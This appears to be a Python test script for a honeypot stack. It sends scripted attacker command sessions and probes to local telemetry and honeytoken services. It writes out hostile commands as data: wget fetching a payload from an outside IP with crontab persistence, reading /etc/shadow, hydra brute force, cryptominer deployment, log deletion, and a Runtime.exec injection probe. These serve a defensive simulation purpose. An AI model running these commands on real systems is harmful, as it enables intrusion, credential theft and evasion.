#!/usr/bin/env python3
"""
scripts/simulate_attack.py

Drives realistic, multi-stage attack scenarios through the running stack
without needing an actual external attacker. Useful for demos, testing,
and populating the dashboard with data.

Each scenario is a session: a sequence of commands sent to the Telemetry
Layer's /ingest endpoint (bypassing the Cowrie->Filebeat->Logstash->ES path
for speed/determinism) plus a couple of direct probes against Elastichoney
and HoneyTrap to exercise those paths too.

Usage:
    python scripts/simulate_attack.py --target http://localhost
"""

import argparse
import random
import time
import uuid

import httpx

SCENARIOS = {
    "recon_only": [
        "uname -a",
        "whoami",
        "cat /proc/cpuinfo",
        "ifconfig",
        "ps aux",
    ],
    "credential_brute_then_dump": [
        "whoami",
        "cat /etc/shadow",
        "hydra -l root -P rockyou.txt ssh://10.0.0.5",
    ],
    "malware_drop_and_persist": [
        "uname -a",
        "wget http://185.220.101.5/payload.sh -O /tmp/.x",
        "chmod 777 /tmp/.x",
        "echo '* * * * * /tmp/.x' >> /etc/crontab",
        "cat ~/.ssh/authorized_keys",
    ],
    "cryptominer_deployment": [
        "wget http://45.137.21.9/xmrig.tar.gz",
        "tar -xzf xmrig.tar.gz",
        "chmod 777 ./xmrig",
        "./xmrig -o pool.minexmr.com:443 -u 4Ab1c2... --donate-level=0",
    ],
    "lateral_movement_attempt": [
        "ip a",
        "netstat -tulpn",
        "masscan 10.0.0.0/24 -p22,445,3389",
        "smbclient -L //10.0.0.12",
    ],
    "log_cleanup_evasion": [
        "history -c",
        "unset HISTFILE",
        "rm -rf /var/log/auth.log",
        "shutdown -r now",
    ],
}

ATTACKER_IPS = ["185.220.101.5", "45.137.21.9", "194.26.29.14", "91.92.109.43"]


def run_session(client: httpx.Client, telemetry_url: str, honeypot: str, commands: list[str], src_ip: str) -> None:
    session_id = str(uuid.uuid4())[:8]
    print(f"\n[session {session_id} | {src_ip}] starting {len(commands)}-command sequence")
    for cmd in commands:
        try:
            resp = client.post(
                f"{telemetry_url}/ingest",
                json={"honeypot": honeypot, "text": cmd, "session": session_id, "src_ip": src_ip},
                timeout=10.0,
            )
            print(f"  > {cmd[:60]:<60} -> {resp.status_code}")
        except httpx.HTTPError as exc:
            print(f"  ! failed to ingest '{cmd}': {exc}")
        time.sleep(0.4)


def probe_elastichoney(client: httpx.Client, base_url: str) -> None:
    print("\n[elastichoney] sending recon + exploit-style probes")
    try:
        client.get(f"{base_url}/")
        client.get(f"{base_url}/_cluster/health")
        client.get(f"{base_url}/_cat/indices")
        client.post(f"{base_url}/_search", json={"script": "Runtime.getRuntime().exec('id')"})
    except httpx.HTTPError as exc:
        print(f"  ! elastichoney probe failed: {exc}")


def trigger_honeytoken_access(client: httpx.Client, honeytrap_url: str) -> None:
    print("\n[honeytrap] simulating a honeytoken being touched")
    try:
        tokens = client.get(f"{honeytrap_url}/tokens", timeout=10.0).json().get("tokens", [])
        if not tokens:
            print("  (no tokens available yet)")
            return
        token = random.choice(tokens)
        client.post(
            f"{honeytrap_url}/tokens/{token['id']}/access",
            json={"source_ip": random.choice(ATTACKER_IPS), "honeypot": "cowrie", "detail": "fake key exfiltrated via scp"},
            timeout=10.0,
        )
        print(f"  > reported access on token {token['id']} ({token.get('type')})")
    except httpx.HTTPError as exc:
        print(f"  ! honeytrap simulation failed: {exc}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost", help="Base host where services are exposed")
    parser.add_argument("--telemetry-port", default=8003)
    parser.add_argument("--elastichoney-port", default=9201)
    parser.add_argument("--honeytrap-port", default=8004)
    args = parser.parse_args()

    telemetry_url = f"{args.target}:{args.telemetry_port}"
    elastichoney_url = f"{args.target}:{args.elastichoney_port}"
    honeytrap_url = f"{args.target}:{args.honeytrap_port}"

    with httpx.Client() as client:
        for name, commands in SCENARIOS.items():
            honeypot = "dionaea" if "cryptominer" in name or "malware" in name else "cowrie"
            run_session(client, telemetry_url, honeypot, commands, random.choice(ATTACKER_IPS))

        probe_elastichoney(client, elastichoney_url)
        trigger_honeytoken_access(client, honeytrap_url)

    print("\nSimulation complete. Open the dashboard to see results: http://localhost:8501")


if __name__ == "__main__":
    main()
